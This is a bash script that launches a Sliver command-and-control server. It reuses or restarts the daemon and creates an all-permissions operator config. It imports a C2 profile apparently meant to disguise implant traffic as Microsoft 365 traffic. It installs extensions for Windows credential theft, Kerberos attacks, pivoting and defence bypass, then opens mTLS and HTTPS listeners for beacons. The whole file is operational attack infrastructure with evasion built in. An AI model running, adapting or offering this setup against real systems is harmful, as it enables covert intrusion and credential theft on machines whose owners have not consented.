#!/bin/bash
# Start Sliver server with auto-listener setup.
# Reuses existing daemon if running and healthy. Starts listeners, drops into client.
#
# Usage:
#   ./start.sh                              # mTLS on 8888
#   ./start.sh --domain cdn.yourdomain.com  # mTLS on 8888 + HTTPS on 443
#   ./start.sh --mtls-port 9999             # custom mTLS port
#   ./start.sh --fresh                      # kill existing server, start clean
set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
export PATH="/usr/local/go/bin:$HOME/go/bin:$PATH"

MTLS_PORT=8888
HTTPS_PORT=443
GRPC_PORT=31337
DOMAIN=""
FRESH=0
while [[ $# -gt 0 ]]; do
    case $1 in
        --domain|-d)     DOMAIN="$2"; shift 2 ;;
        --mtls-port)     MTLS_PORT="$2"; shift 2 ;;
        --https-port)    HTTPS_PORT="$2"; shift 2 ;;
        --fresh)         FRESH=1; shift ;;
        -h|--help)
            echo "Usage: $0 [--domain DOMAIN] [--mtls-port PORT] [--https-port PORT] [--fresh]"
            echo "  --fresh    Kill existing server and start clean (loses active sessions)"
            exit 0 ;;
        *) echo "Unknown: $1"; exit 1 ;;
    esac
done

CFG_DIR="$HOME/.sliver-client/configs"
mkdir -p "$CFG_DIR"

# ─── Helper: run a single command via sliver-client with timeout ───
sliver_cmd() {
    local CMD="$1"
    local TIMEOUT="${2:-30}"
    echo "$CMD" | timeout "$TIMEOUT" "$SCRIPT_DIR/sliver-client" 2>/dev/null
}

# ─── Helper: kill sliver-server and wait until it's actually dead ───
kill_server() {
    if ! pgrep -f "sliver-server" >/dev/null 2>&1; then
        return 0
    fi
    echo "[*] Sending SIGTERM to sliver-server..."
    pkill -f "sliver-server" 2>/dev/null || true
    for i in $(seq 1 10); do
        pgrep -f "sliver-server" >/dev/null 2>&1 || return 0
        sleep 0.5
    done
    echo "[*] Server still running, sending SIGKILL..."
    pkill -9 -f "sliver-server" 2>/dev/null || true
    sleep 2
    # Also kill any child processes (garble, go, compile)
    pkill -9 -f "garble" 2>/dev/null || true
    pkill -9 -f "sliver-client" 2>/dev/null || true
    if pgrep -f "sliver-server" >/dev/null 2>&1; then
        echo "[-] Failed to kill sliver-server. Kill manually: kill -9 $(pgrep -f sliver-server)"
        exit 1
    fi
}

# ─── Helper: free a port ───
free_port() {
    local PORT=$1
    local PIDS
    PIDS=$(lsof -ti :"$PORT" 2>/dev/null || true)
    if [ -n "$PIDS" ]; then
        echo "[*] Freeing port $PORT (PID $PIDS)..."
        echo "$PIDS" | xargs kill -9 2>/dev/null || true
        sleep 1
    fi
}

# ─── Check for existing server ───
SERVER_RUNNING=0
if pgrep -f "sliver-server" >/dev/null 2>&1; then
    SERVER_RUNNING=1
fi

if [ "$SERVER_RUNNING" = "1" ] && [ "$FRESH" = "0" ]; then
    echo "[*] Sliver server running (PID $(pgrep -f 'sliver-server' | head -1)), checking health..."
    if sliver_cmd "jobs" 10; then
        echo "[+] Server healthy — reusing existing daemon (beacons preserved)"
        echo "    Use --fresh to restart clean."
        SERVER_PID=$(pgrep -f "sliver-server" | head -1)
    else
        echo "[!] Server unresponsive. Restarting..."
        FRESH=1
    fi
fi

if [ "$FRESH" = "1" ] || [ "$SERVER_RUNNING" = "0" ]; then
    if [ "$SERVER_RUNNING" = "1" ]; then
        echo "[*] Killing existing sliver-server..."
        echo "    Beacons will reconnect after restart."
        kill_server
    fi

    for PORT in $GRPC_PORT $MTLS_PORT $HTTPS_PORT; do
        free_port "$PORT"
    done

    echo "[*] Starting sliver-server daemon..."
    "$SCRIPT_DIR/sliver-server" daemon &
    SERVER_PID=$!
    disown $SERVER_PID

    echo "[*] Waiting for server daemon..."
    sleep 5
fi

# ─── Create operator config if missing ───
if [ -z "$(ls -A "$CFG_DIR" 2>/dev/null)" ]; then
    echo "[*] Creating operator config..."
    "$SCRIPT_DIR/sliver-server" operator --name local --lhost localhost --permissions all --save "$CFG_DIR/local.cfg"
    if [ -z "$(ls -A "$CFG_DIR" 2>/dev/null)" ]; then
        echo "[-] Operator config creation failed."
        exit 1
    fi
    echo "[+] Operator config created"
fi

# ─── Verify client can connect ───
echo "[*] Verifying client connection..."
READY=0
for i in $(seq 1 20); do
    if sliver_cmd "version" 10 >/dev/null; then
        READY=1; break
    fi
    sleep 2
done
if [ "$READY" = "0" ]; then
    echo "[-] Client cannot connect to server."
    echo "    Try: $0 --fresh"
    exit 1
fi
echo "[+] Server ready (PID ${SERVER_PID:-$(pgrep -f 'sliver-server' | head -1)})"

# ─── Import C2 profile (first run only) ───
MARKER="$HOME/.sliver/.profile_imported"
PROFILE="$SCRIPT_DIR/opsec-profiles/microsoft365-c2.json"
if [ ! -f "$MARKER" ] && [ -f "$PROFILE" ]; then
    echo "[*] Importing microsoft365 C2 profile..."
    if sliver_cmd "c2profiles import -n microsoft365 -f $PROFILE" 30; then
        mkdir -p "$HOME/.sliver" 2>/dev/null
        touch "$MARKER"
        echo "[+] Profile imported"
    else
        echo "[!] Profile import failed/timed out — do it manually in console"
    fi
fi

# ─── Install armory extensions (first run only) ───
ARMORY_MARKER="$HOME/.sliver/.armory_installed"
if [ ! -f "$ARMORY_MARKER" ]; then
    echo "[*] Installing armory extensions (first run — this takes a few minutes)..."
    ARMORY_PKGS="windows-credentials kerberos situational-awareness windows-pivot windows-bypass .net-pivot .net-recon .net-execute"
    ARMORY_FAIL=0
    for PKG in $ARMORY_PKGS; do
        echo "    Installing $PKG..."
        if ! sliver_cmd "armory install $PKG" 120; then
            echo "    [!] $PKG timed out or failed"
            ARMORY_FAIL=1
        fi
    done
    if [ "$ARMORY_FAIL" = "0" ]; then
        mkdir -p "$HOME/.sliver" 2>/dev/null
        touch "$ARMORY_MARKER"
        echo "[+] All armory extensions installed"
    else
        echo "[!] Some armory installs failed — finish manually in console:"
        echo "    armory install <package>"
    fi
fi

# ─── Start listeners ───
echo "[*] Starting mTLS listener on 0.0.0.0:$MTLS_PORT..."
if sliver_cmd "mtls --lhost 0.0.0.0 --lport $MTLS_PORT" 15; then
    echo "[+] mTLS listener started"
else
    echo "[!] mTLS auto-start failed — start manually: mtls --lhost 0.0.0.0 --lport $MTLS_PORT"
fi

if [ -n "$DOMAIN" ]; then
    echo "[*] Starting HTTPS listener on 0.0.0.0:$HTTPS_PORT ($DOMAIN)..."
    if sliver_cmd "https --lhost 0.0.0.0 --lport $HTTPS_PORT -d $DOMAIN" 15; then
        echo "[+] HTTPS listener started"
    else
        echo "[!] HTTPS auto-start failed — start manually in console"
    fi
fi

echo ""
echo "════════════════════════════════════════════════"
echo "  Sliver ready"
echo "  mTLS listener: 0.0.0.0:$MTLS_PORT"
[ -n "$DOMAIN" ] && echo "  HTTPS listener: 0.0.0.0:$HTTPS_PORT ($DOMAIN)"
echo "  Server PID: ${SERVER_PID:-$(pgrep -f 'sliver-server' | head -1)}"
echo "════════════════════════════════════════════════"
echo ""
echo "[*] Dropping into interactive console..."
exec "$SCRIPT_DIR/sliver-client"
